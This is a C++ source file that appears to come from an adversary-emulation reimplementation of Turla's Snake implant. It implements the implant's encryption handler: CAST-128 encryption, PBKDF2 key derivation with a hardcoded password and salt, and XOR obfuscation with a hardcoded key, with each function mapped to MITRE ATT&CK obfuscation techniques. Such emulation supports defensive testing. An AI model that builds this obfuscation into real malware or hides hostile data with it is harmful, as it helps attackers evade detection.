/*
 * Handle encryption
 * 
 * CTI references:
 * [1] https://artemonsecurity.com/snake_whitepaper.pdf
 * [2] https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
 */

#include "enc_handler.h"
#include <stdexcept>
#include <iostream>

namespace enc_handler {
const char* kXorKey = "1f903053jlfajsklj39019013ut098e77xhlajklqpozufoghi642098cbmdakandqiox536898jiqjpe6092smmkeut02906";
const size_t kXorLen = 97;
const std::string kDefaultPassword("checkmateNASA");
const std::string kDefaultSalt("saltandpepper");

// Generate 128-bit key for CAST128 encryption, using the provided password and salt values.
// Uses SHA1 as the hashing function with 5 iterations.
// Reference https://www.cryptopp.com/wiki/PKCS5_PBKDF2_HMAC#Sample_Program
std::vector<unsigned char> GenerateCast128Key(std::string password, std::string salt) {
    size_t password_len = password.length();
    size_t salt_len = salt.length();
    std::vector<unsigned char> generated_key = std::vector<unsigned char>(CryptoPP::CAST128::DEFAULT_KEYLENGTH); // 16 bytes
    
    CryptoPP::byte hash_buffer[CryptoPP::SHA1::DIGESTSIZE]; // 20 bytes
    int num_iterations = 5;

    // https://www.cryptopp.com/wiki/KeyDerivationFunction
    // https://www.cryptopp.com/wiki/PKCS5_PBKDF2_HMAC
    try {
        CryptoPP::PKCS5_PBKDF2_HMAC<CryptoPP::SHA1> pbkdf2_generator;
        pbkdf2_generator.DeriveKey(
            hash_buffer, // key buffer
            sizeof(hash_buffer), 
            0, // not used for PKCS5_PBKDF2_HMAC
            (CryptoPP::byte*)password.data(),
            password_len, 
            (CryptoPP::byte*)salt.data(),
            salt_len, 
            num_iterations
        );
    } catch(CryptoPP::Exception& e) {
        throw std::runtime_error(e.GetWhat());
    }

    for (int i = 0; i < CryptoPP::CAST128::DEFAULT_KEYLENGTH; i++) {
        generated_key[i] = (unsigned char)(hash_buffer[i]);
    }

    return generated_key;
}

/*
 * Cast128Encrypt:
 *      About:
 *         CAST-128 encrypt plaintext using the provided 128-bit key.
 *      Result:
 *          char vector containing resulting ciphertext with the IV prepended.
 *      MITRE ATT&CK Techniques:
 *          T1027: Obfuscated Files or Information
 *      CTI:
 *          https://artemonsecurity.com/snake_whitepaper.pdf
 *          https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/ (references CAST-128 usage in other Turla implants)
 *      Other References:
 *          Sample program from https://www.cryptopp.com/wiki/Block_Cipher
 */
std::vector<char> Cast128Encrypt(ApiWrapperInterface* api_wrapper, std::vector<char> plaintext, std::vector<unsigned char> key) {
    size_t key_size = key.size();
    
    // Verify provided key size
    if (key_size != CryptoPP::CAST128::DEFAULT_KEYLENGTH) {
        throw std::runtime_error("Invalid key size.");
    }

    // Set key and IV. Note that IV and block size are both 8 bytes.
    CryptoPP::byte key_bytes[CryptoPP::CAST128::DEFAULT_KEYLENGTH];
    CryptoPP::byte iv_bytes[CryptoPP::CAST128::BLOCKSIZE];

    std::vector<CryptoPP::byte> iv = api_wrapper->GenerateIvWrapper(CryptoPP::CAST128::BLOCKSIZE);
    
    std::memcpy(key_bytes, &key[0], CryptoPP::CAST128::DEFAULT_KEYLENGTH);
    std::memcpy(iv_bytes, &iv[0], CryptoPP::CAST128::BLOCKSIZE);

    // Buffer for ciphertext
    std::string ciphertext;
    ciphertext.reserve((CryptoPP::CAST128::BLOCKSIZE * 2) + plaintext.size());

    // Encrypt
    CryptoPP::CBC_Mode<CryptoPP::CAST128>::Encryption cast_encryptor(key_bytes, sizeof(key_bytes), iv_bytes);
    CryptoPP::StringSource(std::string(plaintext.begin(), plaintext.end()), true,
        new CryptoPP::StreamTransformationFilter(cast_encryptor,
            new CryptoPP::StringSink(ciphertext)
        )
    );

    // Prepend IV to ciphertext
    size_t combined_size = CryptoPP::CAST128::BLOCKSIZE + ciphertext.length();
    std::vector<char> iv_and_ciphertext = std::vector<char>(combined_size);
    for (int i = 0; i < CryptoPP::CAST128::BLOCKSIZE; i++) {
        iv_and_ciphertext[i] = (char)iv_bytes[i];
    }
    iv_and_ciphertext.insert(iv_and_ciphertext.begin() + CryptoPP::CAST128::BLOCKSIZE, ciphertext.begin(), ciphertext.end());
    iv_and_ciphertext.resize(combined_size);
    return iv_and_ciphertext;
}

/*
 * Cast128Decrypt:
 *      About:
 *         CAST-128 decrypt ciphertext (with prepended IV) using the provided 128-bit key.
 *      Result:
 *          char vector containing resulting plaintext
 *      MITRE ATT&CK Techniques:
 *          T1140: Deobfuscate/Decode Files or Information
 *      CTI:
 *          https://artemonsecurity.com/snake_whitepaper.pdf
 *          https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/ (references CAST-128 usage in other Turla implants)
 *      Other References:
 *          Sample program from https://www.cryptopp.com/wiki/Block_Cipher
 */
std::vector<char> Cast128Decrypt(std::vector<char> ciphertext, std::vector<unsigned char> key) {
    size_t key_size = key.size();
    
    // Verify provided key size
    if (key_size != CryptoPP::CAST128::DEFAULT_KEYLENGTH) {
        throw std::runtime_error("Invalid key size.");
    }

    // Set key and IV. Note that IV and block size are both 8 bytes. First block of ciphertext is IV
    CryptoPP::byte key_bytes[CryptoPP::CAST128::DEFAULT_KEYLENGTH];
    CryptoPP::byte iv_bytes[CryptoPP::CAST128::BLOCKSIZE];
    std::memcpy(key_bytes, &key[0], CryptoPP::CAST128::DEFAULT_KEYLENGTH);
    std::memcpy(iv_bytes, &ciphertext[0], CryptoPP::CAST128::BLOCKSIZE);

    // Buffer for plaintext
    std::string plaintext;
    plaintext.reserve(ciphertext.size());

    // Decrypt
    CryptoPP::CBC_Mode<CryptoPP::CAST128>::Decryption cast_decryptor(key_bytes, sizeof(key_bytes), iv_bytes);
    CryptoPP::StringSource(std::string(ciphertext.begin() + CryptoPP::CAST128::BLOCKSIZE, ciphertext.end()), true,
        new CryptoPP::StreamTransformationFilter(cast_decryptor,
            new CryptoPP::StringSink(plaintext)
        )
    );
    return std::vector<char>(plaintext.begin(), plaintext.end());
}

} //namespace

/*
 * XorInPlace:
 *      About:
 *         XOR-encrypt/decrypt data in-place using a hardcoded XOR key.
 *      Result:
 *          XORs the data in-place.
 *      MITRE ATT&CK Techniques:
 *          T1140: Deobfuscate/Decode Files or Information
 *          T1027: Obfuscated Files or Information
 *      CTI:
 *          https://artemonsecurity.com/snake_whitepaper.pdf
 */
void XorInPlace(unsigned char* input, size_t n) {
    for (size_t i = 0; i < n; i++) {
        input[i] = input[i] ^ enc_handler::kXorKey[i % enc_handler::kXorLen];
    }
}

/*
 * XorInPlace:
 *      About:
 *         XOR-encrypt/decrypt data in-place using a hardcoded XOR key.
 *      Result:
 *          XORs the data in-place.
 *      MITRE ATT&CK Techniques:
 *          T1140: Deobfuscate/Decode Files or Information
 *          T1027: Obfuscated Files or Information
 *      CTI:
 *          https://artemonsecurity.com/snake_whitepaper.pdf
 */
void XorInPlace(char* input, size_t n) {
    XorInPlace((unsigned char*) input, n);
}